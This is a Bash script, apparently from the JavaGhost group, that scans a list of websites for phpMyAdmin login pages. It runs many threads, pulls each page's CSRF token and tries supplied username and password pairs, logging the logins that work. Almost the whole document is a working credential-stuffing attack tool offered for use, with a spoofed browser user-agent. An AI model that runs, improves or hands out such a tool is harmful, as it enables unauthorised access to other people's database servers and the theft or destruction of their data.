# !/bin/bash
# contact : https://fb.me/n00b.me

# color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"

echo -e '''
     JavaGhost phpMyAdmin scanner + auto check login
Created by \e[1;31m:\e[1;37m ./Lolz \e[1;31m-\e[1;37m Thanks to \e[1;31m:\e[1;37m JavaGhost \e[1;31m-\e[1;37m ./Shuzu404
'''

echo -e "${blue}[${red}!${blue}] ${white}Note ${blue}: ${white}Only use this format ${blue}[ ${red}url|user|pass ${blue}]${white}"
read -p $'\e[1;34m[\e[1;31m?\e[1;34m] \e[1;37mInput list \e[1;34m: \e[1;32m' ask
if [[ ! -e $ask ]]; then
	echo -e "${blue}[${red}!${blue}] ${white}File not found!"
	exit
fi
read -p $'\e[1;34m[\e[1;31m?\e[1;34m] \e[1;37mThread to use \e[1;34m: \e[1;32m' limit
echo ""

function CheckLogin(){
	if [[ $(curl --connect-timeout 5 --max-time 5 -s "$(echo "${url}" | cut -d "/" -f1,2,3)/phpMyAdmin/index.php") =~ "pma_username" ]]; then
		local token=$(curl --connect-timeout 5 --max-time 5 -skc Cookies.tmp "$(echo "${url}" | cut -d "/" -f1,2,3)/phpMyAdmin/index.php" -H "User-Agent: ${useragent}" | grep -aPo '(?<=<input type="hidden" name="token" value=").*?(?=")' | head -n1)
		local login=$(curl --connect-timeout 5 --max-time 5 -sikXPOST -b Cookies.tmp "$(echo "${url}" | cut -d "/" -f1,2,3)/phpMyAdmin/index.php" -H "User-Agent: ${useragent}" -d "pma_username=$(echo "${url}" | cut -d "|" -f2)&pma_password=$(echo "${url}" | cut -d "|" -f3)&server=1&target=index.php&token=${token}" | grep -ao "302 Found")
		if [[ $login =~ "302 Found" ]]; then
			echo -e "${blue}[${green}GOOD${blue}] ${white}-${green} $(echo "${url}" | cut -d "/" -f1,2,3)/phpMyAdmin/index.php ${white}- ${blue}[ ${white}User ${blue}:${green} $(echo "${url}" | cut -d "|" -f2) ${white}- Pass ${blue}:${green} $(echo "${url}" | cut -d "|" -f3) ${blue}]${white} - ${blue}[ ${green}LOGIN SUCCESS ${blue}]${white}"
			echo $ask >> results.txt
		else
			echo -e "${blue}[${green}GOOD${blue}] ${white}-${cyan} $(echo "${url}" | cut -d "/" -f1,2,3)/phpMyAdmin/index.php ${white}- ${blue}[ ${cyan}User ${blue}:${red} $(echo "${url}" | cut -d "|" -f2) ${cyan}- Pass ${blue}:${red} $(echo "${url}" | cut -d "|" -f3) ${blue}]${white} - ${blue}[ ${red}LOGIN FAILED ${blue}]${white}"
		fi
	else
		echo -e "${blue}[${red}BAD${blue}] ${white}-${red} $(echo "${url}" | cut -d "/" -f1,2,3)/phpMyAdmin/index.php${white}"
	fi
}

(
	for url in $(cat $ask); do
		((thread=thread%$limit)); ((thread++==0)) && wait
		CheckLogin "$url" &
	done
	wait
)

echo -e "\n${blue}[${green}+${blue}] ${white}Good results saved in ${blue}:${green} $(pwd)/results.txt\n"
